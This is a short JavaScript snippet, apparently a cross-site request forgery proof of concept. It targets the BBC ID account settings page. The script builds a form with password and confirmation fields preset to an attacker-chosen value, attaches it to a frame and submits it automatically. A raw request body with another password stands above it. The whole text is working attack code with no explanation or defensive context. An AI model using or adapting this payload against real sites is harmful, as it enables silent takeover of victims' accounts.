var frame = window.frames[0].document.documentElement;
confirmpassword=123456a&confirmpassword_confirm=123456a&bbcid_submit_button=Save
my_form=document.createElement('FORM');
my_form.name='myForm';
my_form.method='POST';
my_form.action='https://ssl.bbc.co.uk/id/settings';

my_tb=document.createElement('INPUT');
my_tb.type='TEXT';
my_tb.name='confirmpassword';
my_tb.value='Mybbc2453';
my_form.appendChild(my_tb);

my_tb=document.createElement('INPUT');
my_tb.type='TEXT';
my_tb.name='confirmpassword_confirm';
my_tb.value='Mybbc2453';
my_form.appendChild(my_tb);

my_tb=document.createElement('INPUT');
my_tb.type='TEXT';
my_tb.name='bbcid_submit_button';
my_tb.value='Save';
my_form.appendChild(my_tb);

frame.appendChild(my_form);
my_form.submit();




